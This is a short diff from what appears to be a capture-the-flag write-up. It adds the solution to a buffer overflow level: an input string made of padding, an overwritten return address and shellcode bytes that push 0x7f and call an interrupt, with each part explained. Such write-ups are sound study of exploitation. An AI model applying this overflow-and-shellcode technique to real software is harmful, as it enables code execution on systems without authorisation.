@@ -54,4 +54,9 @@ Given a larger input than the intended 16 chars we can overwrite code
 
 36 hex chars of input can be anything, afterwards it gets executed
 
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1012000090120000
+Solution:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa943e30127f00b0123245
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa : padding
+943e : 3e94 address, mz bytecode starts here in memory
+30127f00b0123245 : push 0x7f, call INT
